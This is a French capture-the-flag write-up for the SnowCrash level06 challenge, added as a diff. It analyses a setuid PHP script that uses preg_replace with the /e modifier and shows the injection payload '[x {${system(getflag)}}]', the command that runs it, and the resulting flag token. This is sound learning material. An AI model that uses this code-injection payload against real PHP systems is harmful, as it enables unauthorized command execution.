@@ -1,0 +1,52 @@
+Sur ce niveau j'ai deux fichier :
+
+    level06@SnowCrash:~$ ls
+    level06  level06.php
+
+Le premiers est le scripte php et l'autre c'est son code source.
+Le scriptes est executer avec les droits de flag06 
+    level06@SnowCrash:~$ ls -la
+    total 24
+    dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 .
+    d--x--x--x  1 root    users    340 Aug 30  2015 ..
+    -r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout
+    -r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc
+    -rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
+    -rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
+    -r-x------  1 level06 level06  675 Apr  3  2012 .profile
+
+Il faudrait donc trouver un moyen de lancer 'getflag' depuis ce scripte sachant que je ne peux que lire ces deux fichiers.
+
+Le code source presente quelque faille :
+
+1.La fonction preg_replace est utilisée avec le modificateur /e, qui évalue le remplacement comme du code PHP. Cela peut permettre à un attaquant d'exécuter du code malveillant sur votre serveur. L'utilisation de cette fonctionnalité est fortement déconseillée et est considérée comme obsolète depuis PHP 5.5.0.
+
+2.Le script utilise des arguments de ligne de commande ($argv) sans validation appropriée. Il est important de valider et de filtrer toutes les entrées de l'utilisateur pour éviter les attaques d'injection de code ou d'autres vulnérabilités.
+
+3.Le script utilise file_get_contents pour lire le contenu d'un fichier spécifié par l'utilisateur ($y). Cela peut poser un risque si un utilisateur malveillant parvient à fournir un chemin de fichier arbitraire, car cela peut conduire à la divulgation de données sensibles ou à l'exécution de code malveillant.
+
+4.Les expressions régulières utilisées dans les fonctions y et x ne sont pas échappées ou validées, ce qui peut entraîner des vulnérabilités d'injection ou des comportements inattendus si des données non fiables sont fournies.
+
+je vais exploiter la premiere et regarder si cela fonctionne :
+https://wiki.php.net/rfc/remove_preg_replace_eval_modifier
+je cree un fichier dans le dossier var/crash car ces le seul dossier ou je peux cree et executer un fichier , je met dans ce fichier le code suivant '[x {${system(getflag)}}]' , je le sauvegarde et je le lance 
+
+    level06@SnowCrash:~$ ./level06 /var/crash/test
+    PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
+    Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+    PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
+
+
+    function y($m) { 
+    $m = preg_replace("/\./", " x ", $m); 
+    $m = preg_replace("/@/", " y", $m); 
+    return $m; 
+}
+function x($y, $z) { 
+    $a = file_get_contents($y); 
+    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
+    $a = preg_replace("/\[/", "(", $a); 
+    $a = preg_replace("/\]/", ")", $a); 
+    return $a; 
+}
+$r = x($argv[1], $argv[2]); print $r;
